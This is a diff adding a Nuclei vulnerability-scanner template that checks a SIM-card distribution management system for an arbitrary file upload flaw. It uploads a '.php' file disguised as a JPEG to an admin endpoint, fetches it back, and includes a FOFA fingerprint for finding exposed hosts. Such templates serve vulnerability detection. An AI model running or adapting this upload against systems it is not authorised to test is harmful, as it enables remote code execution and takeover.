@@ -1,0 +1,55 @@
+id: haoka-ue_serve-fileupload
+
+info:
+  name: 号卡极团分销管理系统 ue_serve.php 任意文件上传漏洞
+  author: fgz
+  severity: critical
+  description: 号卡极团分销管理系统，同步对接多平台，同步订单信息，支持敢探号一键上架，首页多套U+商品下单页多套模板，订单查询支持实时物流信息、支持代理商自定义域名、泛域名绑定，内置敢探号、172平台、号氪云平台第三方接口以及号卡网同系统对接!该系统ue_serve.php接口处存在任意文件上传漏洞，会导致系统会被黑客远控。
+  metadata:
+    max-request: 1
+    fofa-query: icon_hash="-795291075"
+    verified: true
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+  file_content: "{{to_lower(rand_text_alpha(20))}}"
+  rboundary: "{{to_lower(rand_text_alpha(32))}}"
+requests:
+  - raw:
+      - |+
+        POST /admin/controller/ue_serve.php?action=image&encode=utf-8 HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----{{rboundary}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        
+        ------{{rboundary}}
+        Content-Disposition: form-data; name="name"
+        
+        1.php
+        ------{{rboundary}}
+        Content-Disposition: form-data; name="upfile"; filename="1.php"
+        Content-Type: image/jpeg
+        
+        {{file_content}}
+        ------{{rboundary}}--
+
+      - |
+        GET {{name}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+    extractors:
+      - type: json
+        part: body
+        name: name
+        json:
+          - '.url'
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{file_content}}')"
